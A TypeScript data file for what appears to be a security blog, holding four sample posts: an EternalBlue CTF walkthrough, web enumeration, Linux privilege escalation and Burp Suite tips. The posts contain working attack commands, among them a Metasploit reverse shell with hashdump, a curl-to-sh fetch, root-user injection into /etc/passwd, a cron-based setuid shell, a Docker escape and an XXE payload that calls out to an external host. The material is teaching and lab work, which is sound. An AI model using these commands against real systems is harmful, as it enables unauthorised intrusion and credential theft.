export interface BlogPost {
  slug: string;
  title: string;
  description: string;
  date: string;
  author: string;
  tags: string[];
  readTime: string;
  content: string;
  featured?: boolean;
}

// Sample blog posts - in a real app, these would be loaded from MDX files
export const blogPosts: BlogPost[] = [
  {
    slug: "tryhackme-blue-walkthrough",
    title: "TryHackMe: Blue Room Walkthrough",
    description: "Complete walkthrough of the Blue room on TryHackMe. Learn how to exploit EternalBlue vulnerability and escalate privileges on a Windows machine.",
    date: "2024-10-20",
    author: "Verve",
    tags: ["TryHackMe", "Windows", "EternalBlue", "Exploitation"],
    readTime: "8 min read",
    featured: true,
    content: `
## Overview

The **Blue** room on TryHackMe is a beginner-friendly CTF focused on exploiting the infamous EternalBlue vulnerability (MS17-010) on a Windows machine.

## Reconnaissance

First, let's scan the target with nmap:

\`\`\`bash
nmap -sC -sV -oN nmap_scan.txt TARGET_IP
\`\`\`

### Key Findings:
- Port 445 (SMB) is open
- Windows 7 Professional 7601 Service Pack 1
- Potentially vulnerable to MS17-010

## Exploitation

### Step 1: Verify EternalBlue Vulnerability

\`\`\`bash
nmap --script smb-vuln-ms17-010 TARGET_IP
\`\`\`

The machine is **confirmed vulnerable**!

### Step 2: Use Metasploit

\`\`\`bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_IP
exploit
\`\`\`

## Post-Exploitation

After gaining a meterpreter session:

\`\`\`bash
# Get system information
sysinfo

# Dump password hashes
hashdump

# Search for flags
search -f flag*.txt
\`\`\`

## Flags

**User Flag:** Located in \`C:\\Users\\Jon\\Desktop\`

**Root Flag:** Located in \`C:\\Users\\Administrator\\Desktop\`

## Key Takeaways

- Always patch your systems! EternalBlue is from 2017
- SMB enumeration is crucial for Windows pentesting
- Metasploit makes exploitation straightforward
- Defense: Disable SMBv1, apply MS17-010 patch

---

**Difficulty:** Easy | **Time:** ~30 minutes
    `
  },
  {
    slug: "web-enumeration-techniques",
    title: "Advanced Web Enumeration Techniques",
    description: "Deep dive into web application enumeration using tools like ffuf, gobuster, and custom scripts. Learn to find hidden endpoints and vulnerabilities.",
    date: "2024-10-18",
    author: "Verve",
    tags: ["Web Security", "Enumeration", "Tools", "Bug Bounty"],
    readTime: "12 min read",
    featured: true,
    content: `
## Introduction

Web enumeration is the foundation of any successful penetration test. This guide covers advanced techniques to discover hidden assets.

## Directory Brute-forcing

### Using ffuf

\`\`\`bash
ffuf -w /usr/share/wordlists/dirb/common.txt \\
     -u https://target.com/FUZZ \\
     -mc 200,301,302 \\
     -fc 404 \\
     -t 100
\`\`\`

### Using gobuster

\`\`\`bash
gobuster dir -u https://target.com \\
            -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\
            -x php,html,js,txt \\
            -t 50
\`\`\`

## Subdomain Enumeration

\`\`\`bash
# Using ffuf
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \\
     -u https://FUZZ.target.com \\
     -mc 200

# Using amass
amass enum -passive -d target.com
\`\`\`

## Parameter Discovery

Find hidden GET/POST parameters:

\`\`\`bash
ffuf -w /usr/share/wordlists/burp-parameter-names.txt \\
     -u https://target.com/endpoint?FUZZ=test \\
     -mc 200 \\
     -fw 100
\`\`\`

## JavaScript Analysis

Extract endpoints from JavaScript files:

\`\`\`bash
# Find all JS files
cat urls.txt | grep -E '\\.js$' > js_files.txt

# Extract endpoints using LinkFinder
python3 linkfinder.py -i https://target.com/app.js -o results.html
\`\`\`

## API Enumeration

\`\`\`bash
# Test common API paths
ffuf -w api-endpoints.txt \\
     -u https://target.com/api/FUZZ \\
     -mc 200,401,403
\`\`\`

## Pro Tips

1. **Always use multiple wordlists** - different contexts reveal different results
2. **Check response sizes** - filter by size to reduce false positives
3. **Monitor for rate limiting** - adjust threads accordingly
4. **Combine tools** - use ffuf + gobuster + manual testing
5. **Save everything** - you'll need results for reporting

## Automation Script

\`\`\`bash
#!/bin/bash
# Quick enumeration script

TARGET=$1
OUTPUT_DIR="enum_results"

mkdir -p $OUTPUT_DIR

echo "[+] Starting enumeration on $TARGET"

# Directory brute-force
echo "[+] Running directory scan..."
gobuster dir -u $TARGET -w common.txt -o $OUTPUT_DIR/dirs.txt

# Subdomain scan
echo "[+] Running subdomain scan..."
ffuf -w subdomains.txt -u https://FUZZ.$TARGET -o $OUTPUT_DIR/subs.json

echo "[+] Enumeration complete! Check $OUTPUT_DIR/"
\`\`\`

## Conclusion

Effective enumeration is about patience, methodology, and knowing your tools. Always enumerate thoroughly before exploitation.

---

**Related:** [Bug Bounty Methodology](/#), [OSINT Techniques](/#)
    `
  },
  {
    slug: "linux-privilege-escalation-guide",
    title: "Linux Privilege Escalation: A Comprehensive Guide",
    description: "Master Linux privilege escalation techniques from basic SUID exploitation to advanced kernel exploits. Includes automated tools and manual techniques.",
    date: "2024-10-15",
    author: "Verve",
    tags: ["Linux", "Privilege Escalation", "CTF", "Red Team"],
    readTime: "15 min read",
    content: `
## Introduction

After gaining initial access to a Linux system, the next step is escalating privileges to root. This guide covers proven techniques.

## Enumeration

### Automated Scripts

\`\`\`bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Smart Enumeration
./lse.sh -l 2
\`\`\`

### Manual Enumeration

\`\`\`bash
# Check current user
id
whoami

# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check for capabilities
getcap -r / 2>/dev/null

# View cron jobs
cat /etc/crontab
ls -la /etc/cron.*
\`\`\`

## SUID Exploitation

### Finding Vulnerable SUID Binaries

\`\`\`bash
find / -perm -4000 -type f -exec ls -ld {} \\; 2>/dev/null
\`\`\`

### Example: Exploiting /usr/bin/find

\`\`\`bash
find /home -exec /bin/bash -p \\;
\`\`\`

### GTFOBins Reference

Check [GTFOBins](https://gtfobins.github.io/) for SUID exploitation methods.

## Sudo Exploitation

### Example: (ALL, !root) /bin/bash

\`\`\`bash
# CVE-2019-14287
sudo -u#-1 /bin/bash
\`\`\`

## Kernel Exploits

\`\`\`bash
# Check kernel version
uname -a

# Search for exploits
searchsploit linux kernel [version]

# Example: Dirty COW (CVE-2016-5195)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
\`\`\`

## Path Hijacking

\`\`\`bash
# Check PATH
echo $PATH

# If script runs with sudo and uses relative paths
export PATH=/tmp:$PATH
echo '/bin/bash' > /tmp/vulnerable_command
chmod +x /tmp/vulnerable_command
sudo /path/to/vulnerable_script.sh
\`\`\`

## Cron Job Exploitation

\`\`\`bash
# Monitor for cron jobs
watch -n 1 'ps aux | grep "^root"'

# If writable script runs as root
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/cron_script.sh
# Wait for cron to execute
/tmp/bash -p
\`\`\`

## Capabilities Abuse

\`\`\`bash
# Example: cap_setuid+ep on Python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
\`\`\`

## NFS Exploitation

\`\`\`bash
# Check NFS exports
cat /etc/exports

# If no_root_squash is set
# On attacker machine:
mkdir /tmp/nfs
mount -t nfs target_ip:/share /tmp/nfs
cd /tmp/nfs
cp /bin/bash .
chmod +s bash

# On target:
/share/bash -p
\`\`\`

## Writable /etc/passwd

\`\`\`bash
# Generate password hash
openssl passwd -1 -salt hack password123

# Add new root user
echo 'hacker:GENERATED_HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker
\`\`\`

## Docker Escape

\`\`\`bash
# If user in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
\`\`\`

## Key Takeaways

1. **Always enumerate thoroughly** - most privesc vectors are found through enumeration
2. **Check GTFOBins** for SUID/sudo abuse
3. **Automated tools are great** but learn manual techniques
4. **Kernel exploits are last resort** - they can crash systems
5. **Document everything** for your reports

## Checklist

- [ ] Run automated enumeration scripts
- [ ] Check sudo permissions
- [ ] Find SUID/SGID binaries
- [ ] Check file capabilities
- [ ] Review cron jobs
- [ ] Check for writable files/directories
- [ ] Look for credentials in files
- [ ] Check for kernel exploits

---

**Practice on:** TryHackMe Linux PrivEsc room, HackTheBox machines
    `
  },
  {
    slug: "burp-suite-pro-tips",
    title: "Burp Suite Pro Tips for Bug Bounty Hunters",
    description: "Advanced Burp Suite techniques that will level up your bug bounty game. From Intruder attacks to custom extensions.",
    date: "2024-10-12",
    author: "Verve",
    tags: ["Burp Suite", "Web Security", "Bug Bounty", "Tools"],
    readTime: "10 min read",
    content: `
## Introduction

Burp Suite is the industry standard for web application security testing. Here are advanced tips most hunters don't know.

## Intruder Attack Types

### Sniper Attack
Perfect for testing single parameters:
\`\`\`
POST /login
user=PAYLOAD&pass=test123
\`\`\`

### Battering Ram
Same payload in multiple positions:
\`\`\`
POST /api
{"user":"PAYLOAD","token":"PAYLOAD"}
\`\`\`

### Pitchfork
Synchronized payloads:
\`\`\`
user=PAYLOAD1&pass=PAYLOAD2
# alice:password123
# bob:qwerty456
\`\`\`

### Cluster Bomb
All combinations (use carefully!):
\`\`\`
?param1=PAYLOAD1&param2=PAYLOAD2
# Tests every combination
\`\`\`

## Match and Replace Rules

Auto-modify requests:
\`\`\`
Type: Request header
Match: User-Agent: .*
Replace: User-Agent: BountyBot/1.0
\`\`\`

## Collaborator for SSRF/XXE

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR_SUBDOMAIN">
]>
<root>&xxe;</root>
\`\`\`

## Repeater Shortcuts

- \`Ctrl+Space\` - Send request
- \`Ctrl+R\` - Send to Repeater
- \`Ctrl+I\` - Send to Intruder
- \`Ctrl+Shift+B\` - Base64 encode
- \`Ctrl+Shift+U\` - URL encode

## Custom Extensions

### Installing Extensions
1. Extender → BApp Store
2. Browse → Install

### Must-Have Extensions:
- **Autorize** - Test authorization flaws
- **Param Miner** - Find hidden parameters
- **Upload Scanner** - Test file uploads
- **Turbo Intruder** - Fast custom attacks
- **Logger++** - Advanced logging

## Scanner Configuration

### Custom Insertion Points
\`\`\`python
# Add custom insertion points for API testing
{"user":"test","role":"§user§"}
\`\`\`

### Audit Optimization
- Disable checks you don't need
- Adjust confidence levels
- Configure timeouts appropriately

## Macro for Multi-Step Auth

1. Project Options → Sessions
2. Add → Macro
3. Record login flow
4. Configure session handling rule

## Target Scope Management

\`\`\`
^https?://.*\\.target\\.com.*$
^https?://target\\.com.*$
\`\`\`

## Pro Search Techniques

Use Bambdas (Burp's Python alternative):

\`\`\`java
// Find all admin endpoints
request.pathWithoutQuery().contains("admin")

// Find potential XSS
response.bodyToString().contains("<script>")

// Find API keys
response.bodyToString().matches(".*[A-Za-z0-9]{32}.*")
\`\`\`

## Performance Tips

1. **Disable unnecessary tools** - only use what you need
2. **Increase memory** - edit burp.sh/bat
3. **Use filter by MIME type** - ignore images/css
4. **Clear history regularly** - keeps Burp fast
5. **Scope everything** - reduces noise

## Collaboration Features

### Sharing Findings
- Save items → Share with team
- Export as HTML report
- Use Burp Collaborator client

## Advanced Scanning

\`\`\`
# Custom payload lists
/usr/share/wordlists/SecLists/Fuzzing/special-chars.txt
/usr/share/wordlists/SecLists/Payloads/XSS/
\`\`\`

## Hotkeys to Master

| Key | Action |
|-----|--------|
| Ctrl+Shift+D | Delete item |
| Ctrl+F | Search |
| Ctrl+H | History |
| F12 | Switch between tabs |

## Common Mistakes

❌ Not setting scope properly  
❌ Ignoring Collaborator interactions  
❌ Not using macros for auth  
❌ Forgetting to clear sensitive data  
❌ Not organizing your workflow  

## Conclusion

Mastering Burp Suite takes practice. Focus on workflow efficiency and understanding each tool's purpose.

---

**Resources:** [PortSwigger Web Academy](https://portswigger.net/web-security), [Burp Extensions](https://portswigger.net/bappstore)
    `
  }
];

export function getPostBySlug(slug: string): BlogPost | undefined {
  return blogPosts.find(post => post.slug === slug);
}

export function getAllPosts(): BlogPost[] {
  return blogPosts.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());
}

export function getPostsByTag(tag: string): BlogPost[] {
  return blogPosts.filter(post => 
    post.tags.some(t => t.toLowerCase() === tag.toLowerCase())
  );
}

export function getAllTags(): string[] {
  const tags = new Set<string>();
  blogPosts.forEach(post => {
    post.tags.forEach(tag => tags.add(tag));
  });
  return Array.from(tags).sort();
}

export function searchPosts(query: string): BlogPost[] {
  const lowercaseQuery = query.toLowerCase();
  return blogPosts.filter(post => 
    post.title.toLowerCase().includes(lowercaseQuery) ||
    post.description.toLowerCase().includes(lowercaseQuery) ||
    post.tags.some(tag => tag.toLowerCase().includes(lowercaseQuery)) ||
    post.content.toLowerCase().includes(lowercaseQuery)
  );
}
